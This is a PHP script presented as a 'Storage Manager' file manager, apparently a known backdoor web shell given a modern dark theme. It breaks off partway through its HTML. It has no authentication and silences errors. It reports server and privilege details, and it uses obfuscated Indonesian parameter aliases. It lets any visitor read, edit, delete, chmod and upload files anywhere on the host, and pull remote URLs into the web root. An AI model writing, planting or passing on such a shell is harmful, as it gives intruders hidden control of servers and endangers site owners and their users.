<?php
/**
 * Modern Dark Storage & File Manager
 * Sharp, high-contrast dark theme with red & green accents.
 */
@ini_set('display_errors', '0');
error_reporting(0);
@set_time_limit(0);

// Helper: Format bytes
function format_bytes($bytes, $precision = 2) {
    if ($bytes <= 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

// Helper: UNIX permissions string
function get_file_perms($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '----------';
    $info = '';
    
    // Type
    if (($perms & 0xC000) === 0xC000) $info .= 's';
    elseif (($perms & 0xA000) === 0xA000) $info .= 'l';
    elseif (($perms & 0x8000) === 0x8000) $info .= '-';
    elseif (($perms & 0x6000) === 0x6000) $info .= 'b';
    elseif (($perms & 0x4000) === 0x4000) $info .= 'd';
    elseif (($perms & 0x2000) === 0x2000) $info .= 'c';
    elseif (($perms & 0x1000) === 0x1000) $info .= 'p';
    else $info .= 'u';

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// Helper: Delete directory recursively
function delete_recursive($target) {
    if (is_dir($target)) {
        $files = @scandir($target);
        if ($files !== false) {
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                delete_recursive($target . DIRECTORY_SEPARATOR . $file);
            }
        }
        return @rmdir($target);
    } elseif (is_file($target)) {
        return @unlink($target);
    }
    return false;
}

// Current Directory
$currentDir = isset($_GET['path']) ? $_GET['path'] : getcwd();
$currentDir = str_replace('\\', '/', realpath($currentDir) ? realpath($currentDir) : $currentDir);
$currentDir = rtrim($currentDir, '/');
if (empty($currentDir)) $currentDir = '/';

$docRoot = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? getcwd());
$docRoot = rtrim($docRoot, '/');

$message = null;
$messageType = 'info';

// Process Actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. Upload Handler
    if (isset($_POST['upload_file']) || isset($_POST['upwkwk']) || isset($_POST['berkasnya']) || isset($_POST['linknya'])) {
        $targetFolder = (isset($_POST['dirnya']) && $_POST['dirnya'] === '2') ? $docRoot : $currentDir;
        
        if (isset($_FILES['berkas']) && !empty($_FILES['berkas']['name'])) {
            $destFile = $targetFolder . '/' . basename($_FILES['berkas']['name']);
            if (@move_uploaded_file($_FILES['berkas']['tmp_name'], $destFile) || @file_put_contents($destFile, @file_get_contents($_FILES['berkas']['tmp_name']))) {
                $message = "File uploaded: " . htmlspecialchars(basename($_FILES['berkas']['name']));
                $messageType = "success";
            } else {
                $message = "Upload failed. Check directory write permissions.";
                $messageType = "error";
            }
        } elseif (!empty($_POST['darilink'])) {
            $fileName = !empty($_POST['namalink']) ? basename($_POST['namalink']) : basename(parse_url($_POST['darilink'], PHP_URL_PATH));
            if (empty($fileName)) $fileName = 'download_' . time() . '.dat';
            $destFile = $targetFolder . '/' . $fileName;
            
            $content = @file_get_contents($_POST['darilink']);
            if ($content !== false && @file_put_contents($destFile, $content) !== false) {
                $message = "Remote file saved: " . htmlspecialchars($fileName);
                $messageType = "success";
            } else {
                $message = "Failed to download remote file.";
                $messageType = "error";
            }
        }
    }

    // 2. Delete Handler
    if ((isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] === 'hapus') || isset($_POST['do_delete'])) {
        $target = $_POST['path'] ?? '';
        if (!empty($target) && file_exists($target)) {
            $isDir = is_dir($target);
            if (delete_recursive($target)) {
                $message = ($isDir ? "Directory" : "File") . " deleted successfully: " . htmlspecialchars(basename($target));
                $messageType = "success";
            } else {
                $message = "Failed to delete. Access denied.";
                $messageType = "error";
            }
        }
    }

    // 3. Rename Handler
    if ((isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] === 'gantinama' && isset($_POST['gantin'])) || isset($_POST['do_rename'])) {
        $oldPath = $_POST['path'] ?? '';
        $newName = $_POST['newname'] ?? '';
        if (!empty($oldPath) && !empty($newName)) {
            $newPath = dirname($oldPath) . '/' . basename($newName);
            if (@rename($oldPath, $newPath)) {
                $message = "Renamed to: " . htmlspecialchars(basename($newPath));
                $messageType = "success";
            } else {
                $message = "Failed to rename item.";
                $messageType = "error";
            }
        }
    }

    // 4. Permissions (Chmod) Handler
    if ((isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] === 'ubahmod' && isset($_POST['chm0d'])) || isset($_POST['do_chmod'])) {
        $targetPath = $_POST['path'] ?? '';
        $permVal = $_POST['perm'] ?? '';
        if (!empty($targetPath) && !empty($permVal)) {
            $octal = octdec(strval($permVal));
            if (@chmod($targetPath, $octal)) {
                $message = "Permissions updated to " . htmlspecialchars($permVal);
                $messageType = "success";
            } else {
                $message = "Failed to update permissions.";
                $messageType = "error";
            }
        }
    }

    // 5. File Edit Handler
    if ((isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] === 'edit' && isset($_POST['gasedit'])) || isset($_POST['do_save_file'])) {
        $targetPath = $_POST['path'] ?? '';
        $content = $_POST['src'] ?? '';
        if (!empty($targetPath)) {
            if (@file_put_contents($targetPath, $content) !== false) {
                $message = "File saved successfully.";
                $messageType = "success";
            } else {
                $message = "Write failed. Permission denied.";
                $messageType = "error";
            }
        }
    }
}

// Read current directory contents
$dirItems = @scandir($currentDir);
$folders = [];
$files = [];

if ($dirItems !== false) {
    foreach ($dirItems as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $currentDir . '/' . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    natcasesort($folders);
    natcasesort($files);
}

// System Information
$sysInfo = [
    'os' => php_uname(),
    'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Standalone',
    'php' => phpversion(),
    'user' => @get_current_user() . ' (UID: ' . @getmyuid() . ')',
    'disable_functions' => @ini_get("disable_functions") ?: 'None',
    'dir_writable' => is_writable($currentDir),
    'root_writable' => is_writable($docRoot)
];

// Determine View States
$viewingFile = isset($_GET['fileloc']) ? $_GET['fileloc'] : null;
$actionChoice = $_POST['pilih'] ?? null;
$actionPath = $_POST['path'] ?? null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager - <?php echo htmlspecialchars(basename($currentDir) ?: '/'); ?></title>
    <style>
        :root {
            --bg-body: #0d0f12;
            --bg-card: #15181e;
            --bg-card-hover: #1c212a;
            --bg-input: #090b0e;
            --border: #262c36;
            --border-light: #373f4d;
            --text-main: #f1f5f9;
            --text-secondary: #94a3b8;
            --text-muted: #64748b;
            --green: #22c55e;
            --green-hover: #16a34a;
            --green-dim: rgba(34, 197, 94, 0.12);
            --red: #ef4444;
            --red-hover: #dc2626;
            --red-dim: rgba(239, 68, 68, 0.12);
            --font-ui: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            --font-code: "JetBrains Mono", Consolas, "Courier New", monospace;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            border-radius: 0 !important; /* Strict sharp corners */
        }

        body {
            font-family: var(--font-ui);
            background-color: var(--bg-body);
            color: var(--text-main);
            line-height: 1.5;
            font-size: 13.5px;
            padding-bottom: 60px;
        }

        a {
            color: var(--text-main);
            text-decoration: none;
            transition: color 0.15s ease;
        }

        a:hover {
            color: var(--green);
        }

        /* Top Header */
        .topbar {
            background-color: var(--bg-card);
            border-bottom: 2px solid var(--border);
            padding: 12px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 50;
        }

        .topbar-brand {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 700;
            font-size: 15px;
            letter-spacing: 0.04em;
            text-transform: uppercase;
            color: #ffffff;
        }

        .brand-indicator {
            width: 8px;
            height: 18px;
            background-color: var(--green);
            display: inline-block;
        }

        .topbar-meta {
            font-size: 12px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .container {
            max-width: 1320px;
            margin: 22px auto;
            padding: 0 16px;
        }

        /* Alert Toast */
        .alert {
            padding: 12px 16px;
            border: 1px solid transparent;
            margin-bottom: 18px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
        }

        .alert-success {
            background: var(--green-dim);
            border-color: var(--green);
            color: #4ade80;
        }

        .alert-error {
            background: var(--red-dim);
            border-color: var(--red);
            color: #f87171;
        }

        /* System Info Grid */
        .sys-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 12px;
            margin-bottom: 18px;
        }

        .sys-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            padding: 12px 16px;
        }

        .sys-label {
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-muted);
            margin-bottom: 4px;
        }

        .sys-val {
            font-size: 13px;
            color: #ffffff;
            font-weight: 500;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        /* Badges */
        .badge {
            display: inline-flex;
            align-items: center;
            padding: 1px 7px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.03em;
            text-transform: uppercase;
            border: 1px solid transparent;
        }

        .badge-writable {
            background: var(--green-dim);
            color: #4ade80;
            border-color: var(--green);
        }

        .badge-locked {
            background: var(--red-dim);
            color: #f87171;
            border-color: var(--red);
        }

        /* Breadcrumb Bar */
        .nav-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            padding: 10px 16px;
            margin-bottom: 18px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }

        .nav-crumbs {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 4px;
            font-size: 13px;
        }

        .crumb-item {
            padding: 3px 8px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            color: var(--text-secondary);
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .crumb-item:hover {
            border-color: var(--green);
            color: #fff;
        }

        .crumb-sep {
            color: var(--text-muted);
            font-size: 11px;
        }

        .nav-actions {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 6px 12px;
            font-size: 12.5px;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid var(--border-light);
            background: var(--bg-card);
            color: var(--text-main);
            transition: all 0.15s ease;
            text-decoration: none;
        }

        .btn:hover {
            background: #ffffff;
            color: #000000;
            border-color: #ffffff;
        }

        .btn-green {
            background: var(--green);
            border-color: var(--green);
            color: #000000;
            font-weight: 700;
        }

        .btn-green:hover {
            background: #4ade80;
            border-color: #4ade80;
            color: #000000;
        }

        .btn-danger {
            background: var(--red-dim);
            border-color: var(--red);
            color: #f87171;
        }

        .btn-danger:hover {
            background: var(--red);
            color: #ffffff;
            border-color: var(--red);
        }

        .btn-icon {
            padding: 6px 8px;
            border: 1px solid var(--border);
            background: transparent;
            color: var(--text-secondary);
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: all 0.12s ease;
        }

        .btn-icon:hover {
            color: #ffffff;
            border-color: var(--border-light);
            background: var(--bg-card-hover);
        }

        .btn-icon.action-view:hover {
            color: #38bdf8;
            border-color: #38bdf8;
        }

        .btn-icon.action-edit:hover {
            color: #4ade80;
            border-color: var(--green);
        }

        .btn-icon.action-rename:hover {
            color: #facc15;
            border-color: #facc15;
        }

        .btn-icon.action-chmod:hover {
            color: #c084fc;
            border-color: #c084fc;
        }

        .btn-icon.action-delete:hover {
            color: #f87171;
            border-color: var(--red);
            background: var(--red-dim);
        }

        /* Inputs */
        input[type="text"], input[type="file"], textarea {
            background: var(--bg-input);
            border: 1px solid var(--border);
            color: #ffffff;
            padding: 7px 12px;
            font-size: 13px;
            outline: none;
            transition: border-color 0.15s ease;
        }

        input[type="text"]:focus, textarea:focus {
            border-color: var(--green);
        }

        /* Panels */
        .panel {
            background: var(--bg-card);
            border: 1px solid var(--border);
            padding: 16px 20px;
            margin-bottom: 18px;
        }

        .panel-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid var(--border);
            padding-bottom: 10px;
            margin-bottom: 14px;
        }

        .panel-title {
            font-size: 13.5px;
            font-weight: 700;
            color: #ffffff;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .upload-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        @media (max-width: 768px) {
            .container {
                margin: 12px auto;
                padding: 0 10px;
            }
            .topbar {
                padding: 10px 14px;
            }
            .panel {
                padding: 12px 14px;
            }
            .upload-grid {
                grid-template-columns: 1fr;
            }
            .table-toolbar {
                flex-direction: column;
                align-items: stretch;
                gap: 8px;
            }
            .search-field {
                width: 100%;
            }
            .nav-card {
                padding: 10px 12px;
            }
        }

        .upload-card {
            background: var(--bg-input);
            border: 1px solid var(--border);
            padding: 14px;
        }

        .upload-card-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            font-weight: 600;
            color: var(--text-muted);
            margin-bottom: 8px;
        }

        /* Table Container */
        .table-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
        }

        .table-toolbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            border-bottom: 1px solid var(--border);
            background: rgba(0, 0, 0, 0.2);
            gap: 12px;
        }

        .search-field {
            width: 240px;
            padding: 6px 10px;
            font-size: 12.5px;
        }

        table.file-table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            min-width: 580px;
        }

        table.file-table th {
            background: #090b0e;
            color: var(--text-muted);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            padding: 10px 16px;
            border-bottom: 1px solid var(--border);
            font-weight: 600;
        }

        table.file-table td {
            padding: 9px 16px;
            border-bottom: 1px solid #1a1e26;
            font-size: 13px;
            vertical-align: middle;
        }

        table.file-table tr:hover td {
            background: var(--bg-card-hover);
        }

        /* Item Row styling */
        .file-cell {
            display: flex;
            align-items: center;
            gap: 10px;
            min-width: 180px;
        }

        .type-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            width: 18px;
            height: 18px;
        }

        .type-icon.folder {
            color: #38bdf8;
        }

        .type-icon.file {
            color: var(--text-muted);
        }

        .file-link {
            font-weight: 500;
            color: var(--text-main);
            white-space: nowrap;
        }

        .file-link.folder-name {
            color: #ffffff;
            font-weight: 600;
        }

        .file-link:hover {
            color: var(--green);
        }

        .perm-code {
            font-family: var(--font-code);
            font-size: 12px;
            white-space: nowrap;
        }

        .perm-code.writable {
            color: #4ade80;
        }

        .perm-code.locked {
            color: #f87171;
        }

        .ops-cell {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 6px;
        }

        /* Editor & Preview */
        .code-editor {
            width: 100%;
            height: 520px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            color: #f8fafc;
            font-family: var(--font-code);
            font-size: 13px;
            line-height: 1.6;
            padding: 14px;
            resize: vertical;
        }

        .code-preview {
            background: var(--bg-input);
            border: 1px solid var(--border);
            padding: 16px;
            max-height: 560px;
            overflow-x: auto;
            color: #e2e8f0;
            font-family: var(--font-code);
            font-size: 13px;
            line-height: 1.6;
        }

        /* Inline SVG general helper */
        .svg-icon {
            width: 16px;
            height: 16px;
            fill: none;
            stroke: currentColor;
            stroke-width: 2;
            stroke-linecap: square;
            stroke-linejoin: miter;
        }
    </style>
</head>
<body>

    <!-- Sharp Topbar -->
    <header class="topbar">
        <div class="topbar-brand">
            <span class="brand-indicator"></span>
            <span>STORAGE MANAGER</span>
        </div>
        <div class="topbar-meta">
            <span>PHP <?php echo htmlspecialchars($sysInfo['php']); ?></span>
            <span>&bull;</span>
            <span><?php echo htmlspecialchars($_SERVER['SERVER_NAME'] ?? 'localhost'); ?></span>
        </div>
    </header>

    <div class="container">
        <!-- Toast / Alerts -->
        <?php if ($message): ?>
            <div class="alert alert-<?php echo $messageType; ?>">
                <?php if ($messageType === 'success'): ?>
                    <svg class="svg-icon" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
                <?php else: ?>
                    <svg class="svg-icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
                <?php endif; ?>
                <span><?php echo $message; ?></span>
            </div>
        <?php endif; ?>

        <!-- System Grid -->
        <div class="sys-grid">
            <div class="sys-card">
                <div class="sys-label">Operating System</div>
                <div class="sys-val" title="<?php echo htmlspecialchars($sysInfo['os']); ?>">
                    <?php echo htmlspecialchars(substr($sysInfo['os'], 0, 35)); ?>
                </div>
            </div>
            <div class="sys-card">
                <div class="sys-label">Web Server</div>
                <div class="sys-val"><?php echo htmlspecialchars(substr($sysInfo['server'], 0, 32)); ?></div>
            </div>
            <div class="sys-card">
                <div class="sys-label">User / Privileges</div>
                <div class="sys-val"><?php echo htmlspecialchars($sysInfo['user']); ?></div>
            </div>
            <div class="sys-card">
                <div class="sys-label">Storage Access</div>
                <div class="sys-val">
                    DIR: <?php echo $sysInfo['dir_writable'] ? '<span class="badge badge-writable">WRITABLE</span>' : '<span class="badge badge-locked">READ-ONLY</span>'; ?>
                    &nbsp;|&nbsp;
                    ROOT: <?php echo $sysInfo['root_writable'] ? '<span class="badge badge-writable">WRITABLE</span>' : '<span class="badge badge-locked">READ-ONLY</span>'; ?>
                </div>
            </div>
        </div>

        <!-- Breadcrumb & Directory Nav -->
        <div class="nav-card">
            <div class="nav-crumbs">
                <a href="?path=/" class="crumb-item" title="Root Directory">
                    <svg class="svg-icon" viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
                </a>
                <span class="crumb-sep">/</span>
                <?php
                $segments = array_values(array_filter(explode('/', $currentDir), 'strlen'));
                $builtPath = '';
                $isWindows = (strpos($currentDir, ':') !== false);
                foreach ($segments as $idx => $seg) {
                    if ($idx === 0 && $isWindows) {
                        $builtPath = $seg;
                    } else {
                        $builtPath .= '/' . $seg;
                    }
                    echo '<a href="?path=' . urlencode($builtPath) . '" class="crumb-item">' . htmlspecialchars($seg) . '</a>';
                    if ($idx < count($segments) - 1) {
                        echo '<span class="crumb-sep">/</span>';
                    }
                }
                ?>
            </div>

            <div class="nav-actions">
                <?php 
                $parentDir = dirname($currentDir);
                if ($parentDir && $parentDir !== $currentDir): ?>
                    <a href="?path=<?php echo urlencode($parentDir); ?>" class="btn" title="Parent Directory">
                        <svg class="svg-icon" viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
                        Up One Level
                    </a>
                <?php endif; ?>
                <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn" title="Refresh Current View">
                    <svg class="svg-icon" viewBox="0 0 24 24"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
                    Refresh
                </a>
            </div>
        </div>

        <!-- Dynamic Panels: View, Edit, Rename, Chmod -->
        <?php if ($viewingFile && file_exists($viewingFile)): ?>
            <!-- VIEW FILE -->
            <div class="panel">
                <div class="panel-head">
                    <div class="panel-title">
                        <svg class="svg-icon" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                        <span>View File: <?php echo htmlspecialchars(basename($viewingFile)); ?></span>
                    </div>
                    <div style="display: flex; gap: 8px;">
                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($viewingFile); ?>">
                            <input type="hidden" name="pilih" value="edit">
                            <button type="submit" class="btn btn-green">Edit File</button>
                        </form>
                        <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">Close</a>
                    </div>
                </div>
                <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 10px;">
                    Location: <?php echo htmlspecialchars($viewingFile); ?> &bull; Size: <?php echo format_bytes(@filesize($viewingFile)); ?>
                </div>
                <pre class="code-preview"><code><?php echo htmlspecialchars(@file_get_contents($viewingFile)); ?></code></pre>
            </div>

        <?php elseif (isset($_GET['pilihan']) && $actionChoice === 'edit' && !empty($actionPath)): ?>
            <!-- EDIT FILE -->
            <div class="panel">
                <div class="panel-head">
                    <div class="panel-title">
                        <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
                        <span>Edit File: <?php echo htmlspecialchars(basename($actionPath)); ?></span>
                    </div>
                    <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">Cancel</a>
                </div>
                <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($actionPath); ?>">
                    <input type="hidden" name="pilih" value="edit">
                    <textarea name="src" class="code-editor" spellcheck="false"><?php echo htmlspecialchars(@file_get_contents($actionPath)); ?></textarea>
                    <div style="margin-top: 12px; display: flex; justify-content: flex-end; gap: 8px;">
                        <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">Cancel</a>
                        <button type="submit" name="gasedit" class="btn btn-green">Save Changes</button>
                    </div>
                </form>
            </div>

        <?php elseif (isset($_GET['pilihan']) && $actionChoice === 'gantinama' && !empty($actionPath)): ?>
            <!-- RENAME -->
            <div class="panel" style="max-width: 520px; margin: 0 auto 18px auto;">
                <div class="panel-head">
                    <div class="panel-title">
                        <svg class="svg-icon" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                        <span>Rename Item</span>
                    </div>
                    <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">&times;</a>
                </div>
                <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($actionPath); ?>">
                    <input type="hidden" name="pilih" value="gantinama">
                    <div style="margin-bottom: 14px;">
                        <label style="display: block; font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; font-weight: 600;">New Name</label>
                        <input type="text" name="newname" value="<?php echo htmlspecialchars(basename($actionPath)); ?>" style="width: 100%;" required autofocus>
                    </div>
                    <div style="display: flex; justify-content: flex-end; gap: 8px;">
                        <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">Cancel</a>
                        <button type="submit" name="gantin" class="btn btn-green">Apply Rename</button>
                    </div>
                </form>
            </div>

        <?php elseif (isset($_GET['pilihan']) && $actionChoice === 'ubahmod' && !empty($actionPath)): ?>
            <!-- CHMOD -->
            <div class="panel" style="max-width: 520px; margin: 0 auto 18px auto;">
                <div class="panel-head">
                    <div class="panel-title">
                        <svg class="svg-icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                        <span>Permissions (chmod)</span>
                    </div>
                    <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">&times;</a>
                </div>
                <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($actionPath); ?>">
                    <input type="hidden" name="pilih" value="ubahmod">
                    <div style="margin-bottom: 14px;">
                        <label style="display: block; font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; font-weight: 600;">Octal Value (e.g. 0755, 0644)</label>
                        <input type="text" name="perm" value="<?php echo substr(sprintf('%o', @fileperms($actionPath)), -4); ?>" style="width: 100%;" required autofocus>
                    </div>
                    <div style="display: flex; justify-content: flex-end; gap: 8px;">
                        <a href="?path=<?php echo urlencode($currentDir); ?>" class="btn">Cancel</a>
                        <button type="submit" name="chm0d" class="btn btn-green">Update Permissions</button>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <!-- Upload & Transfer Section -->
        <div class="panel">
            <div class="panel-head">
                <div class="panel-title">
                    <svg class="svg-icon" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    <span>Upload & File Transfer</span>
                </div>
            </div>

            <form method="POST" enctype="multipart/form-data" action="?path=<?php echo urlencode($currentDir); ?>">
                <div style="margin-bottom: 12px; display: flex; gap: 20px; font-size: 12.5px;">
                    <span style="color: var(--text-muted); font-weight: 600; text-transform: uppercase;">Destination:</span>
                    <label style="cursor: pointer; display: flex; align-items: center; gap: 6px;">
                        <input type="radio" name="dirnya" value="1" checked> Current Directory
                    </label>
                    <label style="cursor: pointer; display: flex; align-items: center; gap: 6px;">
                        <input type="radio" name="dirnya" value="2"> Document Root
                    </label>
                </div>

                <div class="upload-grid">
                    <!-- Local File Upload -->
                    <div class="upload-card">
                        <div class="upload-card-label">Local File</div>
                        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                            <input type="file" name="berkas" style="flex: 1; min-width: 200px;">
                            <button type="submit" name="upload_file" class="btn btn-green">Upload</button>
                        </div>
                    </div>

                    <!-- Remote URL Transfer -->
                    <div class="upload-card">
                        <div class="upload-card-label">Remote Download</div>
                        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                            <input type="text" name="darilink" placeholder="https://domain.com/archive.zip" style="flex: 2; min-width: 150px;">
                            <input type="text" name="namalink" placeholder="save_as.zip" style="flex: 1; min-width: 100px;">
                            <button type="submit" name="upload_file" class="btn btn-green">Download</button>
                        </div>
                    </div>
                </div>
            </form>
        </div>

        <!-- Explorer Table -->
        <div class="table-card">
            <div class="table-toolbar">
                <div style="font-size: 13px; font-weight: 600; color: #ffffff;">
                    Directory Contents (<?php echo count($folders) + count($files); ?> items)
                </div>
                <input type="text" id="filterInput" class="search-field" placeholder="Search files & folders...">
            </div>

            <div style="overflow-x: auto; -webkit-overflow-scrolling: touch;">
                <table class="file-table" id="fileTable">
                    <thead>
                        <tr>
                            <th style="min-width: 200px;">Name</th>
                            <th style="width: 100px; white-space: nowrap;">Size</th>
                            <th style="width: 120px; white-space: nowrap;">Permissions</th>
                            <th style="width: 160px; text-align: right; white-space: nowrap;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Folders -->
                        <?php foreach ($folders as $dir): 
                            $dirFullPath = $currentDir . '/' . $dir;
                            $isWritable = is_writable($dirFullPath);
                            $perms = get_file_perms($dirFullPath);
                        ?>
                            <tr class="table-row">
                                <td>
                                    <div class="file-cell">
                                        <!-- Folder SVG Icon -->
                                        <span class="type-icon folder" title="Directory">
                                            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/></svg>
                                        </span>
                                        <a href="?path=<?php echo urlencode($dirFullPath); ?>" class="file-link folder-name item-name"><?php echo htmlspecialchars($dir); ?></a>
                                    </div>
                                </td>
                                <td style="color: var(--text-muted);">&mdash;</td>
                                <td>
                                    <span class="perm-code <?php echo $isWritable ? 'writable' : 'locked'; ?>">
                                        <?php echo htmlspecialchars($perms); ?>
                                    </span>
                                </td>
                                <td>
                                    <div class="ops-cell">
                                        <!-- Rename Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($dirFullPath); ?>">
                                            <input type="hidden" name="pilih" value="gantinama">
                                            <button type="submit" class="btn-icon action-rename" title="Rename Folder">
                                                <svg class="svg-icon" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                                            </button>
                                        </form>

                                        <!-- Chmod Button -->
                                        <form method="POST" action="?pilihan&path=<?php echo urlencode($currentDir); ?>" style="display:inline;">
                                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($dirFullPath); ?>">
                                            <input type="hidden" name="pilih" value="ubahmod">
                                            <button type="submit" class="btn-icon action-chmod" title="Change Permissions">
